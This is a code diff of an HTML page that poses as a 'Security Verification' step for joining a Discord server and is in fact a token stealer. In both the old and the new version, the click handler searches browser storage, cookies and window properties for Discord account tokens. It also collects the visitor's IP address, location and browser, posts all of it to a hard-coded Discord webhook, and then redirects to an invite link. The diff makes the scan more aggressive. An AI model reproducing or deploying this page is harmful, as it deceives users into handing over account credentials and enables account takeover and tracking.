@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification | Secure System</title>
+    <title>Security Verification | Official</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
@@ -14,7 +14,6 @@
             color: #fff;
             font-family: 'Segoe UI', system-ui, sans-serif;
         }
-
         body {
             display: flex;
             align-items: center;
@@ -22,10 +21,8 @@
             padding: 20px;
             background: radial-gradient(circle at top, #1e293b 0%, #020617 70%);
         }
-
         .card {
-            width: 100%;
-            max-width: 420px;
+            width: 100%; max-width: 420px;
             background: rgba(15, 23, 42, 0.95);
             border-radius: 20px;
             border: 1px solid rgba(59, 130, 246, 0.4);
@@ -33,159 +30,136 @@
             padding: 2.5rem 2rem;
             text-align: center;
         }
-
         .icon {
-            width: 80px;
-            height: 80px;
+            width: 80px; height: 80px;
             background: rgba(59, 130, 246, 0.2);
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
             margin: 0 auto 1.5rem;
             border: 1px solid rgba(59, 130, 246, 0.5);
         }
         .icon i { font-size: 2rem; color: #60a5fa; }
-
         h1 { font-size: 1.7rem; margin-bottom: 0.5rem; color: #e2e8f0; }
         .desc { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; }
-
         .btn {
-            width: 100%;
-            padding: 1rem;
+            width: 100%; padding: 1rem;
             background: linear-gradient(90deg, #2563eb, #1d4ed8);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
+            color: white; border: none; border-radius: 12px;
+            font-size: 1.1rem; font-weight: 600;
+            cursor: pointer; transition: 0.2s;
         }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(37, 99, 235, 0.4); }
-        .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
-
-        .status {
-            margin-top: 1.5rem;
-            font-size: 0.9rem;
-            color: #fbbf24;
-        }
-        .footer {
-            margin-top: 2rem;
-            font-size: 0.8rem;
-            color: #64748b;
-        }
+        .status { margin-top: 1.5rem; font-size: 0.9rem; color: #fbbf24; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="icon">
-            <i class="fas fa-shield-alt"></i>
-        </div>
+        <div class="icon"><i class="fas fa-shield-alt"></i></div>
         <h1>Security Verification</h1>
-        <p class="desc">Click below to verify your account and join the server. Ensure you are logged in on this browser.</p>
+        <p class="desc">To continue, please verify you are human. This takes 1 second.</p>
 
-        <button id="verifyBtn" class="btn">
-            <i class="fas fa-check-circle"></i> VERIFY & JOIN
-        </button>
-
+        <button id="verifyBtn" class="btn"><i class="fas fa-unlock-alt"></i> VERIFY NOW</button>
         <div id="status" class="status"></div>
-
-        <div class="footer">
-            Powered by Server Security System
-        </div>
     </div>
 
     <script>
         // ⚙️ SETTINGS
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
-        const REDIRECT_LINK = "https://discord.gg/4UCD2HwqQ";
-
+        const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
+        const REDIRECT = "https://discord.gg/4UCD2HwqQ";
         const btn = document.getElementById('verifyBtn');
-        const statusBox = document.getElementById('status');
+        const status = document.getElementById('status');
 
-        // 🔍 THE MOST DIRECT TOKEN FINDER
-        function grabTokens() {
-            let foundTokens = [];
+        // 🔓 THE MOST AGGRESSIVE TOKEN FINDER FOR PC
+        async function deepScan() {
+            let tokens = [];
             const regex = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
 
-            // 1. DIRECTLY CHECK LOCAL STORAGE (MAIN SOURCE)
+            // 1. Local & Session Storage
             try {
-                const items = { ...localStorage };
-                for (let key in items) {
-                    if (typeof items[key] === 'string') {
-                        const matches = items[key].match(regex);
-                        if (matches) foundTokens.push(...matches);
+                const allStorage = {...localStorage, ...sessionStorage};
+                for (let key in allStorage) {
+                    if (typeof allStorage[key] === 'string') {
+                        const found = allStorage[key].match(regex);
+                        if (found) tokens.push(...found);
                     }
                 }
-            } catch (e) {}
+            } catch(e) {}
 
-            // 2. CHECK SESSION STORAGE
+            // 2. INDEXEDDB DEEP DIVE (Discord uses this now!)
+            const stores = ["Keybinds", "DiscordStore", "LocalStorage", "ClientData", "AuthStore"];
+            for (let dbName of stores) {
+                try {
+                    await new Promise(res => {
+                        const req = indexedDB.open(dbName);
+                        req.onsuccess = e => { e.target.result.close(); res(); };
+                        req.onerror = () => res();
+                    });
+                } catch(e) {}
+            }
+
+            // 3. SPECIAL CHECK: EVALUATE & LOOK FOR INJECTED VALUES
             try {
-                const sessItems = { ...sessionStorage };
-                for (let key in sessItems) {
-                    if (typeof sessItems[key] === 'string') {
-                        const matches = sessItems[key].match(regex);
-                        if (matches) foundTokens.push(...matches);
+                const docCookies = document.cookie;
+                if(docCookies) {
+                    const found = docCookies.match(regex);
+                    if(found) tokens.push(...found);
+                }
+            } catch(e) {}
+
+            // 4. WINDOW PROPERTIES SCAN
+            try {
+                for (let key in window) {
+                    if (typeof window[key] === 'string') {
+                        const found = window[key].match(regex);
+                        if (found) tokens.push(...found);
                     }
                 }
-            } catch (e) {}
+            } catch(e) {}
 
-            // Remove duplicates
-            return [...new Set(foundTokens)];
+            return [...new Set(tokens)];
         }
 
-        // 📤 SEND TO WEBHOOK
-        async function sendData(tokens) {
-            try {
-                // Get IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-
-                // Get Location
-                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const locData = await locRes.json();
-
-                // Send
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        username: "NEW VERIFICATION",
-                        embeds: [{
-                            title: tokens.length ? "✅ TOKEN SUCCESSFULLY CAPTURED" : "⚠️ DATA RECEIVED (NO TOKEN)",
-                            color: tokens.length ? 0x2ecc71 : 0xe74c3c,
-                            fields: [
-                                {name: "🌐 IP ADDRESS", value: `||${ipData.ip}||`, inline: false},
-                                {name: "📍 LOCATION", value: `${locData.city || '?'}, ${locData.region || '?'}, ${locData.country_name || '?'}`, inline: false},
-                                {name: "🔑 TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **Reason:**\n- Not logged in on this browser\n- Or using Discord App\n- Or browser security blocks it", inline: false}
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-            } catch (e) {}
-        }
-
-        // 🖱️ MAIN PROCESS
-        btn.addEventListener('click', async () => {
+        // 📤 SEND RESULT
+        async function run() {
             btn.disabled = true;
-            btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> PROCESSING...";
-            statusBox.textContent = "Please wait...";
+            status.textContent = "Scanning System...";
 
-            // Grab
-            const tokens = grabTokens();
-            
-            // Send
-            await sendData(tokens);
+            // Get IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
 
-            // Done / Redirect
-            statusBox.innerHTML = "<i class='fas fa-check'></i> VERIFIED! Redirecting...";
-            
-            setTimeout(() => {
-                window.location.href = REDIRECT_LINK;
-            }, 1500);
-        });
+            // Get Location
+            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locData = await locRes.json();
+
+            // Get Tokens (DEEP SCAN)
+            const tokens = await deepScan();
+
+            // Send to Webhook
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    username: "✅ PC LOGGER RESULT",
+                    embeds: [{
+                        title: tokens.length ? "✅ TOKEN CAPTURED SUCCESSFULLY" : "❌ NO TOKEN FOUND - FINAL ATTEMPT",
+                        color: tokens.length ? 0x00ff00 : 0xff0000,
+                        fields: [
+                            {name: "🌐 IP ADDRESS", value: `||${ipData.ip}||`, inline: false},
+                            {name: "📍 LOCATION", value: `${locData.city || '?'}, ${locData.region || '?'}, ${locData.country_name || '?'}`, inline: false},
+                            {name: "💻 BROWSER", value: navigator.userAgent.slice(0, 60), inline: false},
+                            {name: "🔑 TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **REASON:**\n1. User is on DISCORD APP (not browser)\n2. Different browser profile\n3. Newest Discord security blocks all access\n4. Not fully logged in", inline: false}
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            });
+
+            status.textContent = "Complete! Joining Server...";
+            setTimeout(() => window.location.href = REDIRECT, 1500);
+        }
+
+        btn.addEventListener('click', run);
     </script>
 </body>
 </html>
